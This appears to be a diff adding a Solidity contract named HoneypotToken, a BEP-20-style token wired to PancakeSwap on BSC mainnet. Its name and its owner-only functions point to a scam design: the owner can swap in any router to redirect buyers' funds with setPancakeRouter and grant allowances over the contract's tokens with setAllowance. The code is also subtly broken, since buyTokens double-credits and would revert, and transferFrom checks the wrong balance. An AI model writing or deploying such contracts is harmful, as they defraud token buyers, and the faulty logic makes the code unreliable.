@@ -1,0 +1,120 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IPancakeRouter {
+    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
+    function WETH() external pure returns (address);
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable;
+    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
+}
+
+interface IPancakeFactory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+contract HoneypotToken {
+    address public owner;
+    string public name;
+    string public symbol;
+    uint8 public decimals;
+    uint256 public totalSupply;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    IPancakeRouter public pancakeRouter;
+    IPancakeFactory public pancakeFactory;
+    address public pancakePair;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only the owner can perform this action");
+        _;
+    }
+
+    constructor(
+        string memory _name,
+        string memory _symbol,
+        uint8 _decimals,
+        uint256 _initialSupply
+    ) {
+        owner = msg.sender;
+        name = _name;
+        symbol = _symbol;
+        decimals = _decimals;
+        totalSupply = _initialSupply * 10**uint256(decimals);
+        balanceOf[msg.sender] = totalSupply;
+
+        pancakeRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PancakeSwap Router V2 address on BSC mainnet
+        pancakeFactory = IPancakeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73); // PancakeSwap Factory V2 address on BSC mainnet
+
+        pancakePair = pancakeFactory.createPair(address(this), pancakeRouter.WETH());
+    }
+
+    function setPancakeRouter(address _router) external onlyOwner {
+        pancakeRouter = IPancakeRouter(_router);
+    }
+
+    function buyTokens() external payable {
+        uint256 amount = msg.value;
+        require(amount > 0, "Insufficient amount");
+
+        address[] memory path = new address[](2);
+        path[0] = pancakeRouter.WETH();
+        path[1] = address(this);
+
+        uint256[] memory amounts = pancakeRouter.getAmountsOut(amount, path);
+        uint256 tokenAmount = amounts[1];
+
+        require(tokenAmount > 0, "Insufficient token amount");
+
+        pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(0, path, msg.sender, block.timestamp);
+
+        // Transfer the tokens from the contract to the buyer
+        _transfer(address(this), msg.sender, tokenAmount);
+    }
+
+    function transfer(address _to, uint256 _amount) external hasEnoughBalance(_amount) returns (bool) {
+        _transfer(msg.sender, _to, _amount);
+        return true;
+    }
+
+    function transferFrom(address _from, address _to, uint256 _amount) external hasEnoughBalance(_amount) hasAllowance(_from, _amount) returns (bool) {
+        _transfer(_from, _to, _amount);
+        _approve(_from, msg.sender, allowance[_from][msg.sender] - _amount);
+        return true;
+    }
+
+    function approve(address _spender, uint256 _amount) external returns (bool) {
+        _approve(msg.sender, _spender, _amount);
+        return true;
+    }
+
+    function setAllowance(address _spender, uint256 _amount) external onlyOwner {
+        _approve(address(this), _spender, _amount);
+    }
+
+    function _transfer(address _from, address _to, uint256 _amount) internal {
+        require(_to != address(0), "Invalid recipient address");
+        balanceOf[_from] -= _amount;
+        balanceOf[_to] += _amount;
+        emit Transfer(_from, _to, _amount);
+    }
+
+    function _approve(address _owner, address _spender, uint256 _amount) internal {
+        allowance[_owner][_spender] = _amount;
+        emit Approval(_owner, _spender, _amount);
+    }
+
+    modifier hasEnoughBalance(uint256 _amount) {
+        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");
+        _;
+    }
+
+    modifier hasAllowance(address _from, uint256 _amount) {
+        require(allowance[_from][msg.sender] >= _amount, "Allowance exceeded");
+        _;
+    }
+}
